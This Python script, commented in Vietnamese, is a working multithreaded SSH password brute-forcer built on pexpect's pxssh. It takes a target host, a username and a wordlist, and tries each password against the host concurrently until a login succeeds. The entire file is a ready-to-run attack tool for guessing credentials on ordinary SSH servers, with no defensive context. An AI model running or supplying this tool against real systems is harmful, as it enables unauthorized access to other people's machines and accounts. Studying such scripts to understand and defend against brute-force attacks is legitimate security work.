from pexpect import pxssh
import optparse
import time
from threading import *

# global variables
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)#su dung cho da luong (thread), mac dinh la 1, co the set nhu y muon
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh() #la constructor extend cu pxssh.spawn (thiet lap connect ssh)
        s.login(host, user, password) #login ssh, neu true -> xuong duoi, false -> bo qua script duoi
        print("[+] Password Found: " + password)
        Found = True #khi tim dc pass thi se doi sang true
    except Exception as e: #error
        if 'read_nonblocking' in str(e):
           # print("Err1")
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            #print("Err2")
            connect(host, user, password, False)
    finally:#sai hay dung luon vao finally
        if release:
           # print("Finally")
            connection_lock.release()
           # print("Release")


def main():
    #nhap terminor
    parser = optparse.OptionParser('Missing flag: ' + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    options, args = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user == None: #khi nhap dau vao
        print(parser.usage)
        exit(0)

    fn = open(passwdFile, 'r') #open file passwdFile
    for line in fn.readlines():
        if Found:#true
            print("[*] Exiting: Password Found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        connection_lock.acquire()#arg mac dinh true
        password = line.strip('\r').strip('\n')#xuong dong
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))#xu ly da luong, 
        child = t.start()
        print('start')


if __name__ == "__main__":
    main()